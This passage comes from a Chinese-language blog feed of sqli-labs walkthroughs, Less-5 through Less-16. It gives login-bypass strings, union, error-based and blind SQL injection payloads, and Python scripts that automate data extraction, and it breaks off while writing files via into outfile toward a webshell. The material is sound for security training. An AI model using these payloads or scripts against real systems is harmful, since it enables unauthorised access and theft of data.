    <content type="text"><![CDATA[Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1: &quot;or &quot;a&quot;=&quot;a 2： &apos;)or(&apos;a&apos;=&apos;a 3：or 1=1-- 4：&apos;or 1=1-- 5：a&apos;or&apos; 1=1-- 6： &quot;or 1=1-- 7：&apos;or&apos;a&apos;=&apos;a 8： &quot;or&quot;=&quot;a&apos;=&apos;a 9：&apos;or&apos;&apos;=&apos; 10：&apos;or&apos;=&apos;or&apos; 11: 1 or &apos;1&apos;=&apos;1&apos;=1 12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1 13: &apos;OR 1=1%00 14: &quot;or 1=1%00 15: &apos;xor 16: 新型万能登陆密码 用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin） 密码 1 Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23 Password=1 17..admin&apos; or &apos;a&apos;=&apos;a 密码随便 PHP万能密码 &apos;or&apos;=&apos;or&apos; &apos;or 1=1/* 字符型 GPC是否开都可以使用 User: something Pass: &apos; OR &apos;1&apos;=&apos;1 jsp 万能密码 1&apos;or&apos;1&apos;=&apos;1 admin&apos; OR 1=1/* 用户名：admin 系统存在这个用户的时候 才用得上 密码：1&apos;or&apos;1&apos;=&apos;1 payload（1）万能密码在passwd字段后面构造万能密码+闭合单引号 uname=admin&amp;passwd=1&apos; or &apos;1&apos;=&apos;1&amp;submit=Submit 返回 Your Login name:Dumb Your Password:Dumb 在uname字段后面构造万能密码+闭合单引号 uname=admin&apos; or &apos;1&apos;=&apos;1&amp;passwd=1&amp;submit=Submit 返回 Your Login name:admin Your Password:admin 我们发现两者返回的账户密码不一样，查看源代码 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\n\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; sql语句如下： SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1 情况一： SELECT username, password FROM users WHERE username=&apos;admin&apos; and password=&apos;1&apos; or &apos;1&apos;=&apos;1&apos; LIMIT 0,1 情况二： SELECT username, password FROM users WHERE username=&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; and password=&apos;1&apos; LIMIT 0,1 and 优先级高，所以情况一前面为False，但是与True或运算为true，返回了第一个账号和密码；情况二后面为False，但存在admin这个账户，或运算为True，返回了admin账号的账号和密码 （2）联合查询uname=test &amp;passwd=test&apos; order by 3%23 返回错误 uname=test &amp;passwd=test&apos; order by 2%23 返回正确 uname=test &amp;passwd=test&apos; union select 1,2 %23 返回：Your Login name:1 Your Password:2 剩下的注入查询数据库信息与之前get类似 Less-12 POST - Error Based - Double quotes - String -with twist基于报错的双引号带括号的字符注入与Less-11类似 payload1、直接注释 uname=admin &amp;passwd=1&quot;) or &quot;1&quot;=&quot;1&quot; %23 2、闭合绕过 uname=admin &amp;passwd=1&quot;) or (&quot;1&quot;=&quot;1 uname=admin&quot;) or( &quot;1&quot;=&quot;1 &amp;passwd=1 联合查询 uname=test &amp;passwd=test&quot;) order by 3 %23返回错误 uname=test &amp;passwd=test&quot;) order by 2 %23返回正确 uname=test &amp;passwd=test&quot;) union select 1,2 %23 返回： Your Login name:1 Your Password:2 同上 Less-13 POST-Double Injection-Single quotes-String -with twist测试加单引号 uname=test &amp;passwd=test&apos; 报错如下 &apos;&apos;test&apos;&apos;) LIMIT 0,1&apos; 可知是单引号和括号包裹变量 uname=test &amp;passwd=test&apos;) %23返回正常 uname=test &amp;passwd=test&apos;) or 1=1%23 显示successfully loggend in 源代码如下： &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; //echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; //echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 登入成功返回的是flag.jpg图片，图片显示successfully logined in；失败是slap.jpg的图片。不会显示登入的账号和密码信息 payload万能密码登入uname=test &amp;passwd=test&apos;) or 1=1%23 双注入查询原理参考Less-5 uname=test &amp;passwd=test&apos;) or 1=1 order by 3 %23返回错误 uname=test &amp;passwd=test&apos;) or 1=1 order by 2 %23返回正常 uname=test &amp;passwd=test&apos;) or 1=1 union select 1,2 %23返回成功但是没有显示位 使用双查询注入方式 uname=test &amp;passwd=test&apos;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 返回 Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; 剩下的参考Less-5 Less-14 POST-Double Injection-Double quotes-String-with twist测试单引号 uname=test &amp;passwd=test&apos; or 1=1 %23返回失败图片 双引号 uname=test &amp;passwd=test&quot;or 1=1 %23 返回成功图片 参数是由双引号包裹 源代码 $uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;; $passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;; 注意点号是起连接作用，将变量一前一后分别连接一个双引号这里调试直接echo出变量可以看到 uname=uname &amp;passwd=passwd 输出：&quot;uname &quot;&quot;passwd&quot; 可以看到是单引号包裹着 测试字段数 uname=uname &amp;passwd=passwd&quot; or 1=1 order by 2 %23 剩下的与Less-13相似 Less-15 POST-Blind-Boolian/time Based-Single quotes基于布尔型或时间的单引号post盲注测试在后面添加单引号、双引号、括号等无任何错误显示，只显示一个错误的图片，错误回显应该是被注释了。 uname=uname &amp;passwd=passwd&apos; or 1=1 %23返回正确 字段数 uname=uname &amp;passwd=passwd&apos; or 1=1 order by 2 %23 显示位 uname=uname &amp;passwd=passwd&apos; or 1=1 union select 1,2 %23执行成功没有回显 使用双查询输入 uname=test &amp;passwd=test&apos; or 1=1 union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 返回成功但并没有报错显示我们想要的数据 为什么Less13-14中使用双查询输入有效而在这里不行？Less-15源代码 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\n\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; //print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 查看对比两者的源代码可以发现在本关中print_r(mysql_error());函数被注释了 payload这里使用布尔型盲注 uname=test &amp;passwd=test&apos; or length((select database())) =8 %23 返回正确 剩下参考Less-8 Less-16 POST-Blind-Boolian/Time Based-Double quotes基于布尔型或时间的双引号post盲注测试uname=test &amp;passwd=test &apos; or 1=1 %23返回错误 uname=test &amp;passwd=test&apos;) or 1=1 %23返回错误 uname=test &amp;passwd=test &quot; or 1=1 %23返回错误 uname=test &amp;passwd=test&quot;) or 1=1 %23返回正确 payload字段数 uname=test &amp;passwd=test &quot;) or 1=1 order by 2%23返回正确 uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误 剩下参考Less-15]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-8-10]]></title>
    <url>%2F2018%2F04%2F22%2Fsqli-labs-Less-8-10%2F</url>
    <content type="text"><![CDATA[Less-8 GET-Blind-Boolian Based - Single Quotes布尔型单引号GET盲注盲注当不能通过直接显示来获取数据库数据时，使用盲注的方式，根据其返回页面的不同来判断信息(页面内容不同，响应时间)；一般分为布尔型盲注，时间性盲注，报错盲注。 盲注常用函数 函数 功能 length(str) 返回str字符串的长度。 substr(str, pos, len) 将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,len) 跟上面的一样，截取字符串 ascii(str) 返回字符串str的最左面字符的ASCII代码值。 ord(str) 同上，返回ascii码 if(a,b,c) a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 select database() 查询数据库 ascii(substr((select database()),1,1)) 返回数据库名称的第一个字母,转化为ascii码 ascii(substr((select database()),1,1))&gt;64 ascii大于64就返回true，if就返回1，否则返回0 常见的ASCII，A:65,Z:90 a:97,z:122, 0:48, 9:57 布尔型盲注盲注固定式:and ascii(substr(A,1,1))&gt;B and if(ascii(substr(A,1,1))&gt;B,1,0) A 通过是一个select语句，B则是字符串或数字的ascii码，中心思想是通过substr等截取函数以二分法的形式逐个查询匹配想要的信息，过程耗时繁琐。 payload源代分析 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&apos;id&apos;])) { $id=$_GET[&apos;id&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); fclose($fp); // connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} ?&gt; 参数id是由单引号包裹，报错显示函数被注释掉了，之前的双查询注入方法不适用 正确时返回 Welcome Dhakkan You are in...... 错误时返回 Welcome Dhakkan 注入方法sqli-labs/Less-8/?id=1 返回正常 sqli-labs/Less-8/?id=1&apos; 返回错误 sqli-labs/Less-8/?id=1&apos;%23 返回正常，可知是单引号闭合 猜解系统中所有的数据库名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) = 105%23 这里猜到了字母 i 查询当前数据库名长度 sqli-labs/Less-8/?id=1&apos; and length((select database())) =8 %23 长度为 8 查询数据库名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)) &gt; 50 %23 返回正常 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)) =115 %23 通过二分法确定了数据库名的首字母的ascii码值为115（s） 猜解security数据库中的表名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema =&apos;security&apos; limit 1,1),1,1)) = 114 %23 猜解users表中的列名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name =&apos;users&apos; limit 1,1),1,1)) =117 %23 python爆破小脚本#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &apos;http://xxx.xxx.xxx.xxx/&apos; #获取数据长度 def getDataLen(url,payload,min,max): num_min = min num_max = max while min &lt; max: num_mid = (num_min + num_max) /2 #print num_min,num_mid,num_max if (num_max == num_mid) or (num_min == num_mid): num = num_max if not re.findall(r&apos;You are in&apos;,requests.get(url + payload % num_min).text): num = num_min #print &apos;find num = %d&apos; % num return num payload_new = payload % num_mid finalurl = url + payload_new #print finalurl r = requests.get(finalurl) html = r.text result = re.findall(r&apos;You are in&apos;,html) if result: num_min = num_mid + 1 elif not result: num_max = num_mid #获取当前数据库名 def getCurrentDBName(): payload_len = &apos;sqli-labs/Less-8/?id=1\&apos;and length((select database())) &gt; %d %%23 &apos; print &apos;获取数据库名长度&apos; DBNameLen = getDataLen(url,payload_len,1,50) print &apos;DBNameLen: %s&apos; % DBNameLen print &apos;获取数据库名&apos; payloadstart = &apos;sqli-labs/Less-8/?id=1\&apos; and ascii(substr((select database()),%d,1))&apos; payloadend = &apos;&gt; %s %%23&apos; DBName = &apos;&apos; for i in range(1,DBNameLen+1): payload1 = payloadstart % i payload2 = payload1 + payloadend ascii_s = getDataLen(url,payload2,0,128) DBName += chr(ascii_s) print &apos;DBName: %s&apos; % DBName #获取数据库系统中所有的数据库名 def getAllDBName(): payload_start = &apos;sqli-labs/Less-8/?id=1\&apos; and &apos; payload_select = &apos;select schema_name from information_schema.schemata limit %d,1&apos; payload_ascii1 = &apos; ascii(substr((%s)&apos; payload_ascii2 = &apos;,%d,1))&apos; payload_end = &apos;&gt; %s %%23&apos; DBNameLen = [] for i in range(0,10):#此处默认系统中最多有十个数据库 payload_selecti = payload_select % i payload_lengthi = &apos;length((%s))&apos; % payload_selecti payload_end = &apos;&gt; %s %%23&apos; payload = payload_start + payload_lengthi + payload_end #print payload DBNameLen.append(getDataLen(url,payload,0,50)) print &apos;系统中各个数据库的长度&apos; print DBNameLen #DBNameLen = [18, 10, 5, 18, 8, 4, 0, 0, 0, 0] DBName = [] for i in range(0,len(DBNameLen)): print &apos;获取第%d个数据库名&apos; % i payload_selecti = payload_select % i DBNames = &apos;&apos; for j in range(1,DBNameLen[i]+1): payload_ascii1j = payload_ascii1 % payload_selecti payload_ascii2j = payload_ascii2 % j payload = payload_start + payload_ascii1j + payload_ascii2j + payload_end ascii_s = getDataLen(url,payload,0,128) DBNames += chr(ascii_s) print DBNames DBName.append(DBNames) print DBName #获取某个数据库的所有表名 #获取某个表的所有的列名 #获取某个列的所有值 if __name__ == &apos;__main__&apos;: getCurrentDBName() getAllDBName() 结果： 获取数据库名长度 DBNameLen: 8 获取数据库名 DBName: security 系统中各个数据库的长度 [18, 10, 5, 18, 8, 4, 0, 0, 0, 0] 获取第0个数据库名 information_schema 获取第1个数据库名 challenges 获取第2个数据库名 mysql 获取第3个数据库名 performance_schema 获取第4个数据库名 security 获取第5个数据库名 test 获取第6个数据库名 获取第7个数据库名 获取第8个数据库名 获取第9个数据库名 [&apos;information_schema&apos;, &apos;challenges&apos;, &apos;mysql&apos;, &apos;performance_schema&apos;, &apos;security&apos;, &apos;test&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;] 在这里只写了爆破当前数据库名和爆破系统中所有数据库名的部分，后面的表和列的部分类似 Less-9 GET-Time base-Single Quotes时间型单引号get盲注时间型和布尔型的区别在于：时间型无论输入是否合法，返回的页面是相同的，查看源代码确实如此： &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&apos;id&apos;])) { $id=$_GET[&apos;id&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); fclose($fp); // connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} ?&gt; 时间型盲注 函数 作用 sleep() 延时执行，MySQL 5 benchmark() 延时执行，MySQL 4/5 判断是否为时间型盲注sqli-labs/Less-9/?id=1&apos; and sleep(5) %23 或 sqli-labs/Less-9/?id=1&apos; and if(1=1,sleep(5),null) %23 执行后延迟了大概5秒左右才返回，可进行时间型盲注 payload猜解当前数据库 sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))=115, 0,sleep(5)) 剩下的payload构造与Less-8类似 Less-10 GET-Time based - double quotes时间型双引号get盲注这里只要把Less-9的单引号改为双引号即可]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-5-7]]></title>
    <url>%2F2018%2F04%2F20%2Fsqli-labs-Less-5-6%2F</url>
    <content type="text"><![CDATA[Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 函数 功能 count(*) 统计表中所有记录的个数 count(列名) 统计一列中值的个数，其中重复的记录也会被当做有效的记录。 count(distinct 列名) 统计一列中值的个数，其中重复的记录只会被记录一次。 sum(列名) 计算一列值的总和。 avg(列名) 计算一列值的平均值。 max(列名) 计算一列值中的最大值。 min(列名) 计算一列值中的最小值。 rand() 生成0-1之间的小数随机值 floor() 只返回整数部分，小数部分舍弃 round() 函数四舍五入，大于0.5的部分进位，不到则舍弃 concat() 连接函数，可以连接多个字符 group by 将结果以分组的形式返回 什么时候使用双查询注入？适用于注入时没有显示位，但是在有显示位的时候同样适用，有显示位时不建议。双查询注入语句的固定格式 union select 1 from (select+count(*),concat(floor(rand(0)*2),( 注入爆数据语句))a from information_schema.tables group by a)b 测试sqli-labs/Less-5/?id=1 返回如下，与之前不同 Welcome Dhakkan You are in........... 构造payloadselect count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a; 分析：0x3a 表示冒号，rand()2 返回 0-2之间的随机数，floor(rand()2)返回整数0或1。 concat()将返回 ::关键信息::0或者::关键信息::1 字段数sqli-labs/Less-5/?id=1&apos; order by 6 %23 返回错误 sqli-labs/Less-5/?id=1&apos; order by 5%23 返回正确 数据库基本信息sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 返回 Welcome Dhakkan Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; 当前数据库名 sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 版本号 Duplicate entry &apos;::5.5.53::0&apos; for key &apos;group_key&apos; 读取信息数据库名(改变 limit 1,1的值获取所有的)sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select schema_name from information_schema.schemata limit 1,1) )a from information_schema.tables group by a)b %23 表名sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1) )a from information_schema.columns group by a)b %23 列名sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1) )a from information_schema.columns group by a)b %23 数据sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select password from security.users limit 0,1) )a from information_schema.columns group by a)b %23 python 小脚本用来爆破(limit太麻烦)#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &quot;http://192.168.83.134/sqli-labs/Less-5/&quot; #获取数据 def getData(url,payload,file_name): files = open(file_name,&apos;a&apos;) #print url+payload r = requests.get(url+payload) html = r.text #print html data = re.findall(r&apos;::\w{0,20}::&apos;,html) for i in data: files.write(i) files.close() #获取所有数据库名 def getDatabaseName(): filename = &apos;file_databasename.txt&apos; for i in range(0,20): payload_databases = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select schema_name from information_schema.schemata limit %s,1),0x3a,0x3a,floor(rand(0)*2) )a from information_schema.tables group by a)b %%23&apos; % i getData(url,payload_databases,filename) #获取某个数据库的所有表名 def getTableName(databasename): filename = &apos;file_tablename.txt&apos; for i in range(0,20): payload_tables = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (databasename, i) getData(url,payload_tables,filename) #获取某个表中的所有字段名 def getColumnName(tablename): filename = &apos;file_columnname.txt&apos; for i in range(0,20): payload_columns = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name= %s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (tablename,i) getData(url,payload_columns,filename) #获取某个表中的数据 def getColumnData(databasename,tablename,columnname): filename = columnname+&apos;_data.txt&apos; for i in range(0,20): payload_columndata = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select %s from %s.%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (columnname,databasename,tablename,i) getData(url,payload_columndata,filename) if __name__ == &apos;__main__&apos;: #获取数据库中所有的数据库名 print &apos;获取数据库中所有数据库名&apos; getDatabaseName() #获取security数据库的所有表 print &apos;获取security数据库的所有表&apos; databasename = &quot;&apos;security&apos;&quot; getTableName(databasename) #获取表中的字段名 print &apos;获取users表的所有字段名&apos; tablename = &quot;&apos;users&apos;&quot; getColumnName(tablename) #获取users表的username和password print &apos;获取users表的username&apos; databasename = &apos;security&apos; tablename = &apos;users&apos; columnname = &apos;username&apos; getColumnData(databasename,tablename,columnname) 输出四个文本：file_columnname.txt file_databasename.txt file_tablename.txt cat file_databasename.txt file_tablename.txt file_columnname.txt username_data.txt ::information_schema::::challenges::::mysql::::performance_schema::::security::::test:: ::emails::::referers::::uagents::::users:: ::id::::username::::password::::first_name::::last_name:: ::Dumb::::Angelina::::Dummy::::secure::::stupid::::superman::::batman::::admin::::admin1::::admin2::::admin3::::dhakkan::::admin4:: 有些地方还是使用了硬编码不够灵活，使用burpsuit的intruct模块爆破更快 Less-6 GET- Double Query-Double Quotes -String基于get方法请求的双引号双查询字符注入Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。GET-Dump into outfile - String基于get方法的导出文件的字符型注入mysql导出数据的方法select ... into outfile &apos;filename&apos; select可以把被选择的行写入一个文件中，该文件被创建到服务器主机上，因此必须拥有file权限；输出不能是一个已存在的文件，防止文件数据被篡改；在unix中该文件被创建后是可读的，权限有MySQL服务器所有，只能读不能删除。 源码分析$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in.... Use outfile......&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You have an error in your SQL syntax&apos;; //print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} 参数id被单引号和双层括号包裹，正确时显示 You are in…. Use outfile….. 错误时显示 You have an error in your SQL syntax; 构造payloadsqli-labs/Less-7/?id=1&apos;)) %23 sqli-labs/Less-7/?id=1&apos;)) order by 6%23 返回错误 sqli-labs/Less-7/?id=1&apos;)) order by 5%23 返回正常 读写权限测试sqli-labs/Less-7/?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 返回正常，说明具有读写权限 数据库路径和安装路径使用Less-5或Less-6的双查询注入方法发现不起作用对比了源代码后才知道在Less-7中把报错显示注释掉了。 //print_r(mysql_error()); 本来使用 @@basedir 和 @@datadir来查询安装路径和数据库路径这里查询不了，总之前的关卡可知 C:/phpStudy/MySQL/和C:\phpStudy\MySQL\data\推测出目录路径为C:\phpStudy\WWW\sqli-labs\Less-7\ 这里在测试的过程中把报错的注释去掉了，可以看到一个Mysql配置问题 --secure-file-priv option so it cannot execute this statement 在MySQL的目录下的一个my.ini的文件中添加secure_file_priv = 路径重启后执行成功 sqli-labs/Less-7/?id=1&apos;)) union select 1,2,version(),4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/1.txt&quot; %23 直接访问 http://192.168.83.134/sqli-labs/Less-7/1.txt 可以看到之前写的数据，试着写入一句话 